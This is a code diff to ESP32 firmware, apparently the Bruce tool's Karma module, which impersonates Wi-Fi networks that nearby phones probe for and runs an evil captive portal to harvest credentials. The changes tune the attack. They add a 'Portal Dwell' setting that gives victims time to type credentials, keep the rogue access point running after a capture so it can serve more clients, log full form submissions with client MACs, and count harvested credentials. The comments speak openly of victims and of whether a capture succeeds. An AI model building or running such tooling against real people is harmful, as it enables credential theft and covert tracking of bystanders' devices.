@@ -108,7 +108,14 @@ SyncState syncState;
 #define LISTEN_WINDOW 250
 #define KARMA_QUEUE_DEPTH 48
 #define PORTAL_HEARTBEAT_INTERVAL 500
-#define PORTAL_MAX_IDLE 60000
+// How long a single ESSID's portal stays up before Karma moves to the next one.
+// Victims need time to read the page and type credentials, so this is the knob
+// that decides whether a capture succeeds at all. It is only the default: the
+// live value is attackConfig.baseDuration, which "Portal Dwell" in the Karma
+// menu rewrites, and the queue expiry and the on-screen countdown follow it.
+#define KARMA_PORTAL_DWELL_MS 300000
+#define KARMA_PORTAL_DWELL_MIN_S 5
+#define KARMA_PORTAL_DWELL_MAX_S 1800
 #define RATE_LIMIT_WINDOW 60000
 #define MAX_RETRIES_PER_SSID 5
 #define PERMANENT_TARGET_THRESHOLD 10
@@ -184,7 +191,6 @@ struct KarmaRuntimeState {
     uint16_t hop_interval = DEFAULT_HOP_INTERVAL;
     File probe_file;
     RingbufHandle_t macRingBuffer = nullptr;
-    String filen = "";
     std::vector<ProbeRequest> probeBuffer;
     uint16_t probeBufferIndex = 0;
     bool bufferWrapped = false;
@@ -426,7 +432,6 @@ static void freeProbeFrame(ProbeRequest &probe) {
 #define hop_interval (state().hop_interval)
 #define _probe_file (state().probe_file)
 #define macRingBuffer (state().macRingBuffer)
-#define filen (state().filen)
 #define probeBuffer (state().probeBuffer)
 #define probeBufferIndex (state().probeBufferIndex)
 #define bufferWrapped (state().bufferWrapped)
@@ -459,6 +464,11 @@ static void freeProbeFrame(ProbeRequest &probe) {
 #define ssidFrequency (state().ssidFrequency)
 #define popularSSIDs (state().popularSSIDs)
 #define pendingPortals (state().pendingPortals)
+
+// Portal dwell lives outside KarmaRuntimeState on purpose: that state is freed
+// when Karma exits, and a dwell picked from the menu should still be in force
+// the next time Karma is started (it resets to the default on reboot).
+static uint32_t gKarmaPortalDwellMs = KARMA_PORTAL_DWELL_MS;
 #define targetRateLimit (state().targetRateLimit)
 #define lastRateLimitReset (state().lastRateLimitReset)
 #define lastTemplateRotation (state().lastTemplateRotation)
@@ -997,9 +1007,9 @@ String generatePortalId(const String &templateName) {
     return safeName + "_" + String(instance);
 }
 
-void savePortalCredentials(const String &ssid, const String &identifier, const String &password, 
-                          const String &mac, uint8_t channel, const String &templateName, 
-                          const String &portalId) {
+void savePortalCredentials(
+    const String &ssid, const String &data, const String &mac, uint8_t channel, const String &portalId
+) {
     FS *fs = nullptr;
     if (!getFsStorage(fs)) return;
 
@@ -1013,15 +1023,19 @@ void savePortalCredentials(const String &ssid, const String &identifier, const S
     String filename = "/PortalCreds/" + portalId + ".txt";
     File file = fs->open(filename, FILE_WRITE);
     if (file) {
+        // The old record split the submission into "Identifier"/"Password",
+        // but neither matched what the victim typed: the identifier was the
+        // literal string "user" and the password held EvilPortal's on-screen
+        // log, whose field names are truncated to three characters ("use:",
+        // "pas:"). Report the form exactly as it was submitted instead, as
+        // name=value pairs, so which field is which is unambiguous.
         file.println("=== PORTAL CAPTURE ===");
         file.printf("Portal: %s\n", portalId.c_str());
         file.printf("Time: %lu\n", millis());
-        file.printf("Template: %s\n", templateName.c_str());
-        file.printf("SSID: %s\n", ssid.c_str());
+        file.printf("Rogue ESSID: %s\n", ssid.c_str());
         file.printf("Client MAC: %s\n", mac.c_str());
         file.printf("Channel: %d\n", channel);
-        file.printf("Identifier: %s\n", identifier.c_str());
-        file.printf("Password: %s\n", password.c_str());
+        file.printf("Data: \"%s\"\n", data.c_str());
         file.println("=====================");
         file.close();
         Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
@@ -1029,17 +1043,64 @@ void savePortalCredentials(const String &ssid, const String &identifier, const S
 
     File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
     if (logFile) {
-        logFile.printf("Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
-                      millis(), portalId.c_str(), ssid.c_str(), identifier.c_str(),
-                      password.c_str(), mac.c_str(), channel);
+        logFile.printf(
+            "Time:%lu | Portal:%s | ESSID:%s | MAC:%s | CH:%d | Data:\"%s\"\n",
+            millis(),
+            portalId.c_str(),
+            ssid.c_str(),
+            mac.c_str(),
+            channel,
+            data.c_str()
+        );
         logFile.close();
     }
+}
+
+// Counts captured credentials across /BruceEvilCreds/*.csv.
+//
+// That directory is written by EvilPortal::saveToCSV(), one appended line per
+// submitted form, so the line count is the capture count. The Karma menu used
+// to report only on /PortalCreds, which meant it showed "no captures" even when
+// credentials were being harvested correctly.
+static size_t countEvilPortalCreds() {
+    FS *fs = nullptr;
+    if (!getFsStorage(fs)) return 0;
+    if (!fs->exists("/BruceEvilCreds")) return 0;
+
+    File dir = fs->open("/BruceEvilCreds");
+    if (!dir) return 0;
+    if (!dir.isDirectory()) {
+        dir.close();
+        return 0;
+    }
+
+    size_t total = 0;
+    uint8_t buf[128];
+    File entry = dir.openNextFile();
+    while (entry) {
+        String name = String(entry.name());
+        name.toLowerCase();
+        if (!entry.isDirectory() && name.endsWith(".csv")) {
+            int n;
+            while ((n = entry.read(buf, sizeof(buf))) > 0) {
+                for (int i = 0; i < n; i++) {
+                    if (buf[i] == '\n') total++;
+                }
+            }
+        }
+        entry.close();
+        entry = dir.openNextFile();
+    }
+    dir.close();
+    return total;
 }
 
 String generateUniqueFilename(FS &fs, bool compressed) {
     String basePath = "/ProbeData/";
     String baseName = compressed ? "karma_compressed_" : "probe_capture_";
-    String extension = compressed ? ".bin" : ".txt";
+    // .csv, because that is what the text format is: a header row and one
+    // comma-separated record per probe. A .txt made every viewer guess.
+    String extension = compressed ? ".bin" : ".csv";
     if (!fs.exists(basePath)) fs.mkdir(basePath);
     int counter = 1;
     String filename;
@@ -2317,7 +2378,7 @@ void checkPortals() {
     if (activePortal->instance != nullptr) {
         activePortal->instance->checkAndExtendDuration();
         activePortal->targetEngaged = activePortal->instance->hasRecentPageView();
-        
+
         if (activePortal->targetEngaged) {
             if (activePortal->engagementTime == 0) {
                 activePortal->engagementTime = now;
@@ -2327,31 +2388,30 @@ void checkPortals() {
 
         unsigned long portalAge = now - activePortal->launchTime;
 
-        if (activePortal->instance->hasCredentials()) {
-            String password = activePortal->instance->getCapturedPassword();
-            String identifier = ""; // EvilPortal doesn't have getCapturedIdentifier
+        // Persist credentials as soon as they appear, without tearing the
+        // portal down: more than one client on the same ESSID can be served,
+        // and the AP no longer disappears while a victim is still typing.
+        if (activePortal->instance->hasCredentials() && !activePortal->hasCreds) {
+            String data = activePortal->instance->getCapturedData();
             activePortal->hasCreds = true;
-            activePortal->capturedPassword = password;
-            activePortal->capturedIdentifier = identifier;
-            
+            activePortal->capturedData = data;
+            activePortal->capturedPassword = activePortal->instance->getCapturedPassword();
+
             if (activePortal->clientFingerprint != 0) {
                 updateClientSuccessRate(activePortal->clientFingerprint, true);
             }
-            
+
             savePortalCredentials(
                 activePortal->ssid,
-                identifier.isEmpty() ? "user" : identifier,
-                password,
-                "unknown",
+                data,
+                activePortal->instance->getCapturedClientMac(),
                 activePortal->channel,
-                activePortal->instance->getApName(),
                 activePortal->portalId
             );
-            destroyActivePortal();
-            lastPortalHeartbeat = now;
-            return;
         }
 
+        // One predictable deadline per ESSID. Engaged targets keep the
+        // previous extended durations; everyone else gets the dwell.
         if (activePortal->targetEngaged) {
             uint32_t maxDuration = attackConfig.extendedDuration;
             if (activePortal->pageViewCount > 10) {
@@ -2552,14 +2612,22 @@ void executeTieredAttackStrategy() {
     }
 }
 
+// A queued ESSID is dropped once it has waited for several dwell slots, so the
+// queue does not drain faster than the portals can serve it.
+static unsigned long pendingPortalExpiryMs() {
+    unsigned long expiry = (unsigned long)attackConfig.baseDuration * 3;
+    return expiry < 300000UL ? 300000UL : expiry;
+}
+
 void checkPendingPortals() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
     unsigned long now = millis();
-    
+    unsigned long expiry = pendingPortalExpiryMs();
+
     pendingPortals.erase(
         std::remove_if(pendingPortals.begin(), pendingPortals.end(),
-            [now](const PendingPortal &p) { 
-                if (now - p.timestamp > 300000) return true;
+            [now, expiry](const PendingPortal &p) {
+                if (now - p.timestamp > expiry) return true;
                 if (p.failureCount >= 3) return true;
                 return false;
             }),
@@ -3123,7 +3191,8 @@ void updateKarmaDisplay() {
 
         if (activePortal != nullptr) {
             unsigned long portalAge = currentTime - activePortal->launchTime;
-            unsigned long portalLeftMs = (portalAge >= PORTAL_MAX_IDLE) ? 0 : (PORTAL_MAX_IDLE - portalAge);
+            unsigned long dwell = attackConfig.baseDuration;
+            unsigned long portalLeftMs = (portalAge >= dwell) ? 0 : (dwell - portalAge);
             unsigned long portalLeftSec = portalLeftMs / 1000;
 
             String portalText = "Active Portal: " + activePortal->ssid;
@@ -3150,11 +3219,19 @@ void updateKarmaDisplay() {
 // Save Functions
 // ============================================================
 
-void saveProbesToFile(FS &fs, bool compressed) {
-    if (!storageAvailable) return;
+String saveProbesToFile(FS &fs, bool compressed) {
+    if (!storageAvailable) return "";
     if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
+
+    // Name the file after the format actually being written. This used to come
+    // from a session-wide "filen" fixed when Karma started, so every save
+    // overwrote the same file. Deriving it here also means each save gets its
+    // own file instead of overwriting the session's one.
+    String filename = generateUniqueFilename(fs, compressed);
+    bool written = false;
+
     if (compressed) {
-        File file = fs.open(filen, FILE_WRITE);
+        File file = fs.open(filename, FILE_WRITE);
         if (file) {
             file.write('K');
             file.write('R');
@@ -3183,25 +3260,57 @@ void saveProbesToFile(FS &fs, bool compressed) {
                 file.write(&flags, 1);
             }
             file.close();
+            written = true;
         }
     } else {
-        File file = fs.open(filen, FILE_WRITE);
+        File file = fs.open(filename, FILE_WRITE);
         if (file) {
             file.println("Timestamp,MAC,RSSI,Channel,SSID,PMKID");
             int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
             count = std::min(count, 200);
+
+            // One row per (client, ESSID). A phone repeats the same directed
+            // probe every few seconds, so the raw buffer holds the same pair
+            // many times over. The sighting kept is the strongest one, which
+            // is the best estimate of how close the client came and carries
+            // the channel it was heard best on. Rows stay in first-seen order.
+            std::vector<int> rows;
+            rows.reserve(count);
             for (int i = 0; i < count; i++) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
-                if (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*")) {
-                    file.printf("%lu,%s,%d,%d,\"%s\",%s\n",
-                               probe.timestamp, probe.mac, probe.rssi, probe.channel,
-                               probe.ssid, probe.isPMKID ? "YES" : "NO");
+                if (probeSSIDEmpty(probe) || probeSSIDEquals(probe, "*WILDCARD*")) continue;
+
+                bool merged = false;
+                for (int &kept : rows) {
+                    const ProbeRequest &seen = probeBuffer[kept];
+                    if (strcmp(seen.mac, probe.mac) != 0 || strcmp(seen.ssid, probe.ssid) != 0) continue;
+                    if (probe.rssi > seen.rssi) kept = idx;
+                    merged = true;
+                    break;
                 }
+                if (!merged) rows.push_back(idx);
+            }
+
+            for (int idx : rows) {
+                const ProbeRequest &probe = probeBuffer[idx];
+                // An SSID is 32 arbitrary bytes, quotes included, so the field
+                // is quoted and embedded quotes are doubled per RFC 4180.
+                // Otherwise one crafted ESSID shifts every column.
+                String ssid = probe.ssid;
+                ssid.replace("\"", "\"\"");
+                file.printf("%lu,%s,%d,%d,\"%s\",%s\n",
+                            probe.timestamp, probe.mac, probe.rssi, probe.channel,
+                            ssid.c_str(), probe.isPMKID ? "YES" : "NO");
             }
             file.close();
+            written = true;
         }
     }
+
+    // An unopenable file is not a save: say so instead of naming a path that
+    // does not exist.
+    return written ? filename : String("");
 }
 
 void saveProbesToPCAP(FS &fs) {
@@ -3456,13 +3565,11 @@ void karma_setup() {
     if (getFsStorage(Fs)) {
         FileSys = (Fs == &SD) ? "SD" : "LittleFS";
         is_LittleFS = (Fs == &LittleFS);
-        filen = generateUniqueFilename(*Fs, false);
         storageAvailable = true;
     } else {
         Fs = &LittleFS;
         FileSys = "LittleFS";
         is_LittleFS = true;
-        filen = generateUniqueFilename(LittleFS, false);
         storageAvailable = checkLittleFsSizeNM();
     }
     if (storageAvailable && !Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");
@@ -3503,8 +3610,8 @@ void karma_setup() {
     attackConfig.fastTierDuration = 20000;
     attackConfig.cloneDuration = 90000;
     attackConfig.maxCloneNetworks = 3;
-    attackConfig.baseDuration = 15000;
-    attackConfig.extendedDuration = 180000;
+    attackConfig.baseDuration = gKarmaPortalDwellMs;
+    attackConfig.extendedDuration = gKarmaPortalDwellMs;
     attackConfig.enableTemplateABTesting = true;
     attackConfig.templateRotationInterval = 5;
     attackConfig.enableContextualTemplate = true;
@@ -3702,7 +3809,51 @@ void karma_setup() {
                      delay(1000);
                      screenNeedsRedraw = true;
                  }},
-                {"Rotate MAC Now", [&]() {
+                 {"Portal Dwell", [&]() {
+                     // Built before the vector so the label outlives loopOptions().
+                     // Seconds the rogue AP + portal are offered for one ESSID
+                     // before Karma tears it down and moves to the next queued
+                     // one. Long enough to fill in a form beats covering more
+                     // ESSIDs: the ESP32 has a single softAP, so only one ESSID
+                     // can be impersonated at a time.
+                     auto applyDwell = [](uint32_t seconds) {
+                         if (seconds < KARMA_PORTAL_DWELL_MIN_S) seconds = KARMA_PORTAL_DWELL_MIN_S;
+                         if (seconds > KARMA_PORTAL_DWELL_MAX_S) seconds = KARMA_PORTAL_DWELL_MAX_S;
+                         gKarmaPortalDwellMs = seconds * 1000;
+                         attackConfig.baseDuration = gKarmaPortalDwellMs;
+                         attackConfig.extendedDuration = gKarmaPortalDwellMs;
+                         // The live portal follows the new deadline too, so the
+                         // change is not stuck behind the current ESSID.
+                         if (activePortal != nullptr && activePortal->instance != nullptr) {
+                             activePortal->instance->setBaseDuration(seconds);
+                             activePortal->instance->setExtendedDuration(seconds);
+                         }
+                         displayTextLine("Dwell: " + String(seconds) + "s");
+                         delay(1000);
+                     };
+
+                     String dwellLabel =
+                         "Dwell: " + String(attackConfig.baseDuration / 1000) + "s";
+                     std::vector<Option> dwellOptions = {
+                         {"30 seconds", [&]() { applyDwell(30); }},
+                         {"60 seconds", [&]() { applyDwell(60); }},
+                         {"2 minutes", [&]() { applyDwell(120); }},
+                         {"5 minutes (default)", [&]() { applyDwell(300); }},
+                         {"10 minutes", [&]() { applyDwell(600); }},
+                         {"Custom...",
+                          [&]() {
+                              String typed = num_keyboard(
+                                  String(attackConfig.baseDuration / 1000), 4, "Seconds per ESSID:"
+                              );
+                              if (typed.isEmpty()) return;
+                              applyDwell((uint32_t)typed.toInt());
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(dwellOptions);
+                     screenNeedsRedraw = true;
+                 }},
+                 {"Rotate MAC Now", [&]() {
                      generateRandomBSSID(currentBSSID);
                      lastMACRotation = millis();
                      displayTextLine("MAC rotated");
@@ -4084,7 +4235,18 @@ void karma_setup() {
                      loopOptions(broadcastOptions);
                  }},
                 {"View Captures", [&]() {
+                     // Built before the vector so the label outlives loopOptions().
+                     String credsLabel = "Creds: " + String(countEvilPortalCreds());
                      std::vector<Option> viewOptions = {
+                         {credsLabel.c_str(), [&]() {
+                              FS *fs;
+                              if (getFsStorage(fs) && fs->exists("/BruceEvilCreds")) {
+                                  loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                              } else {
+                                  displayTextLine("No captures yet");
+                                  delay(1000);
+                              }
+                          }},
                          {"Portal Creds", [&]() {
                               FS *fs;
                               if (getFsStorage(fs) && fs->exists("/PortalCreds")) {
@@ -4110,10 +4272,17 @@ void karma_setup() {
                 {"Save Probes", [&]() {
                      FS *saveFs;
                      if (getFsStorage(saveFs) && storageAvailable) {
-                         saveProbesToFile(*saveFs, true);
-                         displayTextLine("Probes saved!");
+                         // CSV, not the compressed format: nothing reads KRM
+                         // back, so a save nobody can open is not a save.
+                         String saved = saveProbesToFile(*saveFs, false);
+                         if (saved.isEmpty()) {
+                             displayTextLine("Save failed");
+                         } else {
+                             int slash = saved.lastIndexOf('/');
+                             displayTextLine(slash >= 0 ? saved.substring(slash + 1) : saved);
+                         }
                      } else displayTextLine("No storage!");
-                     delay(1000);
+                     delay(1500);
                  }},
                 {"Clear Probes", [&]() {
                      clearProbes();
